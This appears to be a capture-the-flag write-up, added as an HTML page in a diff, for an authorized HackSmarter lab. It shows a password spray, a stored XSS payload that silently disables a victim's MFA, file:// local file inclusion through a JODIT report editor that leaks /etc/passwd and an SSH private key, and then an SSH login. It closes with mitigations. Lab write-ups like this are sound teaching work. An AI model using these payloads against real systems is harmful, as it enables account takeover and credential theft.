@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackSmarter Embedded — XSS MFA bypass to LFI/SSH</title>
+<style>
+  :root { --bg:#0b111b; --panel:#121a27; --text:#e6eef7; --muted:#9fb0c3; --good:#5ddea8; --code:#1a2433; --border:#243246; }
+  * { box-sizing: border-box; }
+  body { margin:0; font-family:"Segoe UI",system-ui,sans-serif; background:var(--bg); color:var(--text); line-height:1.65; }
+  .wrap { max-width:920px; margin:0 auto; padding:48px 24px 96px; }
+  h1 { font-size:1.85rem; margin:0 0 0.4em; }
+  h2 { font-size:1.4rem; margin-top:2.2em; border-bottom:1px solid var(--border); padding-bottom:0.35em; }
+  .muted { color:var(--muted); }
+  .hero { background:linear-gradient(145deg,#152033,#0f1622 55%,#1a1020); border:1px solid var(--border); border-radius:16px; padding:28px; margin-bottom:2rem; }
+  .pill { display:inline-block; background:rgba(239,50,87,0.15); color:#ff7a95; border:1px solid rgba(239,50,87,0.4); border-radius:999px; padding:0.2em 0.75em; font-size:0.8rem; font-weight:600; text-transform:uppercase; }
+  table.meta { width:100%; border-collapse:collapse; margin:1rem 0; }
+  table.meta td { padding:0.35em 0.5em; border-bottom:1px solid var(--border); vertical-align:top; }
+  table.meta td:first-child { color:var(--muted); width:28%; }
+  pre { background:var(--code); border:1px solid var(--border); border-radius:10px; padding:14px 16px; overflow-x:auto; font-size:0.82rem; }
+  code { font-family:ui-monospace,Menlo,Consolas,monospace; color:#c9e4ff; }
+  figure { margin:1.5rem 0; background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:10px; }
+  figure img { max-width:100%; height:auto; display:block; border-radius:8px; }
+  figcaption { color:var(--muted); font-size:0.88rem; margin-top:0.6rem; }
+  .flag { background:#0e1f18; border:1px solid rgba(93,222,168,0.45); color:var(--good); font-family:ui-monospace,Menlo,Consolas,monospace; padding:14px 16px; border-radius:10px; margin:1rem 0; }
+  .why { background:rgba(59,130,246,0.08); border-left:3px solid #3b82f6; padding:0.75rem 1rem; margin:0.75rem 0 1rem; border-radius:0 8px 8px 0; }
+  a { color:#7cb8ff; }
+  footer { margin-top:3rem; color:var(--muted); font-size:0.9rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero">
+  <span class="pill">HackSmarter · Web · Medium</span>
+  <h1>Embedded: spray → XSS MFA kill → JODIT LFI → SSH</h1>
+  <p class="muted">Authorized lab. Author: Tyler Ramsbey. Solved 2026-08-07.</p>
+</div>
+
+<table class="meta">
+  <tr><td>Target</td><td><code>10.1.154.2</code> · web <code>:8080</code> · SSH <code>:2222</code></td></tr>
+  <tr><td>Given</td><td><code>brian:HackSmarter123!</code> · leaked pass <code>cJ2yxWMs3XEHbO</code> · username list</td></tr>
+  <tr><td>Chain</td><td>Password spray → tommy · stored XSS disables MFA · JODIT <code>file://</code> LFI · SSH key</td></tr>
+  <tr><td>Flag</td><td><code>HSM{3xpL0iT_Ch41n_M4st3R}</code></td></tr>
+</table>
+
+<h2>Pre-req</h2>
+<ul>
+  <li>Password spraying methodology (response length / redirect filtering)</li>
+  <li>Stored XSS impact beyond alert() — same-origin API abuse</li>
+  <li>Local file inclusion via rich-text / image URL handlers</li>
+  <li>SSH private key reuse</li>
+</ul>
+
+<h2>Core concept</h2>
+<p>
+  A shared password lands you on an MFA-protected account. Messaging allows HTML, so XSS runs
+  <strong>as the victim</strong> and calls <code>/api/mfa/disable</code>. Privileged report editor
+  fetches <code>file://</code> URLs into base64 image sources — steal SSH keys offline.
+</p>
+
+<figure>
+  <img src="images/01-login.png" alt="Login" />
+  <figcaption>Figure 1 — HackSmarter Cloud login (:8080).</figcaption>
+</figure>
+
+<h2>1. Spray → tommy</h2>
+<pre><code># given password against username list (filter by Location: /dashboard or /mfa
+# or response size — not by absence of "Sign In" alone)
+# Rate limit is strict (e.g. 3/min) — slow spray
+username=tommy  password=cJ2yxWMs3XEHbO  → MFA challenge</code></pre>
+
+<h2>2. Stored XSS disables MFA</h2>
+<p>As <code>brian</code>, messages support HTML. When tommy (bot) views the message:</p>
+<pre><code>&lt;img src=x onerror="fetch('/api/mfa/disable',{method:'POST',credentials:'include'})"&gt;</code></pre>
+<div class="why">
+  <strong>Why:</strong> browser executes XSS with tommy’s cookies → same-site API disables MFA without UI confirmation.
+</div>
+<p class="muted"><a href="requests/01-xss-mfa-disable.http">01-xss-mfa-disable.http</a></p>
+
+<figure>
+  <img src="images/02-tommy-dashboard.png" alt="Tommy dashboard" />
+  <figcaption>Figure 2 — After MFA kill: login as tommy → dashboard with <strong>Generate Report</strong>.</figcaption>
+</figure>
+
+<h2>3. JODIT LFI → SSH key</h2>
+<pre><code>POST /dashboard/report
+report_html=&lt;img src="file:///etc/passwd"&gt;
+# response rewrites img to data:image/jpeg;base64,&lt;file contents&gt;
+
+report_html=&lt;img src="file:///home/tommy/.ssh/id_rsa"&gt;
+# base64-decode → OpenSSH private key</code></pre>
+<figure>
+  <img src="images/03-jodit-report.png" alt="JODIT report editor" />
+  <figcaption>Figure 3 — Administrator report editor (JODIT).</figcaption>
+</figure>
+<p class="muted"><a href="requests/02-lfi-report.http">02-lfi-report.http</a></p>
+
+<h2>4. SSH + flag</h2>
+<pre><code>chmod 600 tommy_id_rsa
+ssh -p 2222 -i tommy_id_rsa tommy@10.1.154.2
+cat ~/flag.txt</code></pre>
+<figure>
+  <img src="images/04-flag.png" alt="Flag" />
+  <figcaption>Figure 4 — Flag recovered.</figcaption>
+</figure>
+<div class="flag">HSM{3xpL0iT_Ch41n_M4st3R}</div>
+
+<h2>Beyond Root</h2>
+<ul>
+  <li>Rate-limit + lockout on login; never rely on MFA alone after password spray.</li>
+  <li>Sanitize message HTML; CSP; block inline handlers.</li>
+  <li>Rich editors: allow only http(s) image schemes; never fetch <code>file://</code>.</li>
+  <li>SSH keys not readable by web process; use short-lived certs.</li>
+</ul>
+
+<footer>Authorized HackSmarter lab · mccleod1290.github.io · 2026-08-07</footer>
+</div>
+</body>
+</html>
